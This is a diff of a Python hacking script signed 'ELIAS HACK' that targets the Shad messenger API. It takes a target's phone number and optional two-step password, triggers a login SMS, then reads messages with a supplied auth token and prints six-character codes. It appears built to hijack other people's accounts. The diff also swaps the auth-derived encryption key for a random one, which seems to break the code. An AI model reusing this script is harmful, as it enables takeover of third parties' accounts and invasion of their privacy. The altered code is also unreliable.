@@ -1,30 +1,28 @@
 import os 
 try:
-	import base64,urllib3,time
+    import base64, urllib3, time
 except:
-	os.system("pip install urllib3")
+    os.system("pip install urllib3")
 try:
-	from requests import post
+    from requests import post
 except:
-	os.system("pip install requests")
+    os.system("pip install requests")
 
 from random import choice
 try:
-	from json import loads, dumps
+    from json import loads, dumps
 except:
-	os.system("pip install json")
+    os.system("pip install json")
 try:
-	from Crypto.Cipher import AES
+    from Crypto.Cipher import AES
 except:
-	os.system("pip install pycryptodome")
+    os.system("pip install pycryptodome")
 from string import digits, ascii_lowercase
-from Crypto.Util.Padding import pad,unpad
+from Crypto.Util.Padding import pad, unpad
 try:
-	from colorama import Fore
+    from colorama import Fore
 except:
-	os.system("pip install colorama")
-
-
+    os.system("pip install colorama")
 
 print(Fore.LIGHTBLUE_EX+"CODED BY ELIAS HACK")
 time.sleep(1)
@@ -34,17 +32,15 @@ print(Fore.GREEN+"Telegram:@THe_hackr")
 time.sleep(2)
 os.system("clear")
 
-
-
-android: dict = lambda: {"eliashack" : "elias hack","app_version" : "2.9.8","platform" : "Android","package" : "ir.medu.shad","lang_code" : "en"}
-random_string: str = lambda size, choices=[*ascii_lowercase, *digits]: "".join([choice(choices) for _ in range(size)])
-url: str = "https://shadmessenger80.iranlms.ir"
+android = lambda: {"eliashack" : "elias hack","app_version" : "2.9.8","platform" : "Android","package" : "ir.medu.shad","lang_code" : "en"}
+random_string = lambda size, choices=[*ascii_lowercase, *digits]: "".join([choice(choices) for _ in range(size)])
+url = "https://shadmessenger80.iranlms.ir"
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class encrypt:
     def __init__(self, auth):
-        self.key = bytearray(self.secret(auth), "UTF-8")
+        self.key = bytearray(random_string(32), "UTF-8")  # Create a random key with 32 bytes length
         self.iv = bytearray.fromhex('00000000000000000000000000000000')
 
     def replaceCharAt(self, e, t, i):
@@ -80,46 +76,45 @@ class encrypt:
         return result
         
 def SendSMS(phone_number: str, password: str) -> dict:
-	tmp = random_string(32)
-	enc = encrypt(tmp)
-	data = {"phone_number":f"98{phone_number[1:]}","send_type":"Internal"}
-	if password != None: data["pass_key"] = password
-	return loads(enc.decrypt(post(url=url, json={"api_version":"5","tmp_session": tmp,"data_enc": enc.encrypt(dumps({"method":"sendCode","input":data,"client": android()}))}).json().get("data_enc")))
+    tmp = random_string(32)
+    enc = encrypt(tmp)
+    data = {"phone_number":f"98{phone_number[1:]}","send_type":"Internal"}
+    if password != None: data["pass_key"] = password
+    return loads(enc.decrypt(post(url=url, json={"api_version":"5","tmp_session": tmp,"data_enc": enc.encrypt(dumps({"method":"sendCode","input":data,"client": android()}))}).json().get("data_enc")))
 
 def GetMsg(auth: str) -> dict:
-	enc = encrypt(auth)
-	data = {"api_version":"5","auth": auth,"data_enc":enc.encrypt(dumps({"method":"getMessagesInterval","input":{"object_guid":"s0B0e8da28a4fde394257f518e64e800","middle_message_id":"0"},"client": android()}))}
-	while True:
-		try:
-			return loads(enc.decrypt(post(url=url, json=data).json().get("data_enc"))).get("data").get("messages")
-			break
-		except: ...
+    enc = encrypt(auth)
+    data = {"api_version":"5","auth": auth,"data_enc":enc.encrypt(dumps({"method":"getMessagesInterval","input":{"object_guid":"s0B0e8da28a4fde394257f518e64e800","middle_message_id":"0"},"client": android()}))}
+    while True:
+        try:
+            return loads(enc.decrypt(post(url=url, json=data).json().get("data_enc"))).get("data").get("messages")
+            break
+        except: ...
+            
 do_marhale1 = input('aya targer do marhale dard y/n: ')
 none = None
 if do_marhale1 == 'n':
-	passw = none
+    passw = none
 elif do_marhale1 == 'y':
-	e = input('enter do marhale:')
-	passw = e
-	
-	
+    e = input('enter do marhale:')
+    passw = e
+    
 auth_key = input(Fore.GREEN+"enter auth:")
 phone = input(Fore.CYAN+"enter phone:")
 
-		
-
 while True:
-	try:
-		print(Fore.GREEN+"""                 github: https://github.com/Elyas-Hack (: \n\n please dont edit source /:     
-		chanell rubika: @github_anonymous""")
-		print(SendSMS(phone_number=phone, password=passw))
-		break
-	except: ...
+    try:
+        print(Fore.GREEN+"github: https://github.com/Elyas-Hack (: \n\n please dont edit source /:     \nchanell rubika: @github_anonymous")
+        print(SendSMS(phone_number=phone, password=passw))
+        break
+    except: ...
 
 time.sleep(2)
 
 messages = GetMsg(auth=auth_key)
 
 for msg in messages:
-	if len(msg["text"]) == 6:
-		print("code ==>>> ",msg["text"])
+    if len(msg["text"]) == 6:
+        print("code ==>>> ",msg["text"])
+		
+
